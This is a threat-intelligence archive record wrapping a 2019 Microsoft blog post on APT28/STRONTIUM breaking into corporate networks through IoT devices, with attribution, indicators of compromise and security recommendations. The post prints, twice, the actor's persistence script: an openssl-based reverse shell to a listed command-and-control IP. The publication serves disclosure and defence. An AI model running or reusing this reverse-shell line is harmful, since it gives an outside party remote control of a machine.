{
    "id": "e1c5467f-2c19-4874-ba38-321d2df40ffa",
    "created_at": "2023-01-12T15:05:34.579083Z",
    "updated_at": "2025-03-27T02:17:11.661314Z",
    "deleted_at": null,
    "sha1_hash": "0fe6e50f295f53794989cf7dabe1a81b55222e55",
    "title": "2019-08-05 - Corporate IoT – a path to intrusion (APT28-STRONTIUM)",
    "authors": "",
    "file_creation_date": "2022-05-28T22:00:24Z",
    "file_modification_date": "2022-05-28T22:00:24Z",
    "file_size": 126932,
    "plain_text": "# Corporate IoT – a path to intrusion\n\n**[msrc-blog.microsoft.com/2019/08/05/corporate-iot-a-path-to-intrusion/](https://msrc-blog.microsoft.com/2019/08/05/corporate-iot-a-path-to-intrusion/)**\n\nSeveral sources estimate that by the year 2020 some 50 billion IoT devices will be deployed\nworldwide. IoT devices are purposefully designed to connect to a network and many are\nsimply connected to the internet with little management or oversight. Such devices still must\nbe identifiable, maintained, and monitored by security teams, especially in large complex\nenterprises. Some IoT devices may even communicate basic telemetry back to the device\nmanufacturer or have means to receive software updates. In most cases however, the\ncustomers’ IT operation center don’t know they exist on the network.\n\nIn 2016, the Mirai botnet was discovered by the malware research group MalwareMustDie.\nThe botnet initially consisted of IP cameras and basic home routers, two types of IoT devices\ncommonly found in the household. As more variants of Mirai emerged, so did the list IoT\ndevices it was targeting. The source code for the malware powering this botnet was\neventually leaked online.\n\nIn 2018, hundreds of thousands of home and small business networking and storage devices\nwere compromised and loaded with the so-called “VPN Filter” malware. The FBI has publicly\nattributed this activity to a nation-state actor and took subsequent actions to disrupt this\nbotnet, although the devices would remain vulnerable to re-infection unless proper firmware\nor security controls were put in place by the user.\n\nThere were also multiple press reports of cyber-attacks on several devices during the\nopening ceremonies for the 2018 Olympic Games in PyeongChang. Officials did confirm a\nfew days later that they were a victim of malicious cyber-attacks that prevented attendees\nfrom printing their tickets to the Games and televisions and internet access in the main press\ncenter simply stopped working.\n\n\n-----\n\n## Three IoT devices\n\nIn April, security researchers in the Microsoft Threat Intelligence Center discovered\ninfrastructure of a known adversary communicating to several external devices. Further\nresearch uncovered attempts by the actor to compromise popular IoT devices (a VOIP\nphone, an office printer, and a video decoder) across multiple customer locations. The\ninvestigation uncovered that an actor had used these devices to gain initial access to\ncorporate networks. In two of the cases, the passwords for the devices were deployed\nwithout changing the default manufacturer’s passwords and in the third instance the latest\nsecurity update had not been applied to the device.\n\nThese devices became points of ingress from which the actor established a presence on the\nnetwork and continued looking for further access. Once the actor had successfully\nestablished access to the network, a simple network scan to look for other insecure devices\nallowed them to discover and move across the network in search of higher-privileged\naccounts that would grant access to higher-value data. After gaining access to each of the\nIoT devices, the actor ran tcpdump to sniff network traffic on local subnets. They were also\nseen enumerating administrative groups to attempt further exploitation. As the actor moved\nfrom one device to another, they would drop a simple shell script to establish persistence on\nthe network which allowed extended access to continue hunting. Analysis of network traffic\nshowed the devices were also communicating with an external command and control (C2)\nserver.\n\n— contents of `[IOT Device]`\n\n```\nfile-\n```\n```\n#!/bin/sh\nexport [IOT Device]\n=\"-qws -display :1 -nomouse\"\necho 1|tee /tmp/.c;sh -c '(until (sh -c \"openssl s_client -quiet -host\n167.114.153.55 -port 443 |while : ; do sh && break; done| openssl s_client quiet -host 167.114.153.55 -port 443\"); do (sleep 10 && cn=$((`cat\n/tmp/.c`+1)) && echo $cn|tee /tmp.c && if [ $cn -ge 30 ]; then (rm\n/tmp/.c;pkill -f 'openssl'); fi);done)&' &\n--end contents of file-\n```\n_Figure 1: script used to maintain network persistence_\n\nThe following IP addresses are believed to have been used by the actor for command and\ncontrol (C2) during these intrusions:\n\n167.114.153.55\n\n\n-----\n\n94.237.37.28\n\n82.118.242.171\n\n31.220.61.251\n\n128.199.199.187\n\n## Attribution\n\nWe attribute the attacks on these customers using three popular IoT devices to an activity\ngroup that Microsoft refers to as STRONTIUM. Since we identified these attacks in the early\nstages, we have not been able to conclusively determine what STRONTIUM’s ultimate\nobjectives were in these intrusions.\n\nOver the last twelve months, Microsoft has delivered nearly 1400 nation-state notifications to\nthose who have been targeted or compromised by STRONTIUM. One in five notifications of\nSTRONTIUM activity were tied to attacks against non-governmental organizations, think\ntanks, or politically affiliated organizations around the world. The remaining 80% of\nSTRONTIUM attacks have largely targeted organizations in the following sectors:\ngovernment, IT, military, defense, medicine, education, and engineering. We have also\nobserved and notified STRONTIUM attacks against Olympic organizing committees, antidoping agencies, and the hospitality industry. The “VPN Filter” malware has also been\nattributed to STRONTIUM by the FBI.\n\n## Call to action\n\nToday we are sharing this information to raise awareness of these risks across the industry\nand calling for better enterprise integration of IoT devices, particularly the ability to monitor\nIoT device telemetry within enterprise networks. Today, the number of deployed IoT devices\noutnumber the population of personal computers and mobile phones, combined. With each\nnetworked IoT device having its own separate network stack, it’s quite easy to see the need\nfor better enterprise management, especially in today’s “bring your own device” world.\n\nWhile much of the industry focuses on the threats of hardware implants, we can see in this\nexample that adversaries are happy to exploit simpler configuration and security issues to\nachieve their objectives. These simple attacks taking advantage of weak device\nmanagement are likely to expand as more IoT devices are deployed in corporate\nenvironments. Upon conclusion of our investigation, we shared this information with the\nmanufacturers of the specific devices involved and they have used this event to explore new\nprotections in their products. However, there is a need for broader focus across IoT in\ngeneral, both from security teams at organizations that need to be more aware of these\n\n\n-----\n\ntypes of threats, as well as from IoT device makers who need to provide better enterprise\nsupport and monitoring capabilities to make it easier for security teams to defend their\nnetworks.\n\n## Indicators of Compromise\n\nBelow are a series of indicators Microsoft has observed as active during the STRONTIUM\nactivity discussed in this article.\n\n## Command-and-Control (C2) IP addresses:\n\n167.114.153.55\n\n94.237.37.28\n\n82.118.242.171\n\n31.220.61.251\n\n128.199.199.187\n\n## Script for maintaining persistence on network connected device\n\n```\nfile-\n```\n```\nexport [IOT Device]\n=\"-qws -display :1 -nomouse\"\necho 1|tee /tmp/.c;sh -c '(until (sh -c \"openssl s_client -quiet -host\n167.114.153.55 -port 443 |while : ; do sh && break; done| openssl s_client quiet -host 167.114.153.55 -port 443\"); do (sleep 10 && cn=$((`cat\n/tmp/.c`+1)) && echo $cn|tee /tmp.c && if [ $cn -ge 30 ]; then (rm\n/tmp/.c;pkill -f 'openssl'); fi);done)&' &\n--end contents of file-\n## Recommendations for Securing Enterprise IoT\n\n```\nThere are additional steps an organization can take to protect their infrastructure and\nnetwork from similar activity. Microsoft recommends the following actions to better secure\nand manage risk associated with IoT devices:\n\n1. Require approval and cataloging of any IoT devices running in your corporate\n\nenvironment.\n\n\n-----\n\n2. Develop a custom security policy for each IoT device.\n3. Avoid exposing IoT devices directly to the internet or create custom access controls to\n\nlimit exposure.\n4. Use a separate network for IoT devices if feasible.\n5. Conduct routine configuration/patch audits against deployed IoT devices.\n6. Define policies for isolation of IoT devices, preservation of device data, ability to\n\nmaintain logs of device traffic, and capture of device images for forensic investigation.\n7. Include IoT device configuration weaknesses or IoT-based intrusion scenarios as part\n\nof Red Team testing.\n8. Monitor IoT device activity for abnormal behavior (e.g. a printer browsing SharePoint\n\nsites…).\n9. Audit any identities and credentials that have authorized access to IoT devices, users\n\nand processes.\n10. Centralize asset/configuration/patch management if feasible.\n\n11. If your devices are deployed/managed by a 3rd party, include explicit Terms in your\n\ncontracts detailing security practices to be followed and Audits that report security\nstatus and health of all managed devices.\n12. Where possible, define SLA Terms in IoT device vendor contracts that set a mutually\n\nacceptable window for investigative response and forensic analysis to any compromise\ninvolving their product.\n\n_[This case is one of several examples that Eric Doerr will present at Black Hat, on August 8,](https://www.blackhat.com/us-19/briefings/schedule/#the-enemy-within-modern-supply-chain-attacks-16241)_\n_2019, where Microsoft is calling for greater industry transparency to ensure that defenders_\n_are best equipped to respond to threats from well-resourced adversaries._\n\n_Microsoft Threat Intelligence Center (MSTIC)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-08-05 - Corporate IoT – a path to intrusion (APT28-STRONTIUM).pdf"
    ],
    "report_names": [
        "2019-08-05 - Corporate IoT – a path to intrusion (APT28-STRONTIUM).pdf"
    ],
    "threat_actors": [
        {
            "id": "3b046db2-f60e-49ae-8e16-0cf82a4be6fb",
            "created_at": "2022-10-25T16:07:23.427162Z",
            "updated_at": "2025-03-27T02:02:09.79482Z",
            "deleted_at": null,
            "main_name": "Buhtrap",
            "aliases": [
                "Buhtrap",
                "Operation TwoBee",
                "Ratopak Spider",
                "UAC-0008"
            ],
            "source_name": "ETDA:Buhtrap",
            "tools": [
                "AmmyyRAT",
                "Buhtrap",
                "CottonCastle",
                "FlawedAmmyy",
                "NSIS",
                "Niteris EK",
                "Nullsoft Scriptable Install System",
                "Ratopak"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "01d569b1-f089-4a8f-8396-85078b93da26",
            "created_at": "2023-01-06T13:46:38.411615Z",
            "updated_at": "2025-03-27T02:00:02.826863Z",
            "deleted_at": null,
            "main_name": "BuhTrap",
            "aliases": [],
            "source_name": "MISPGALAXY:BuhTrap",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535934,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653775224,
    "ts_modification_date": 1653775224,
    "files": {
        "pdf": "https://archive.orkl.eu/0fe6e50f295f53794989cf7dabe1a81b55222e55.pdf",
        "text": "https://archive.orkl.eu/0fe6e50f295f53794989cf7dabe1a81b55222e55.txt",
        "img": "https://archive.orkl.eu/0fe6e50f295f53794989cf7dabe1a81b55222e55.jpg"
    }
}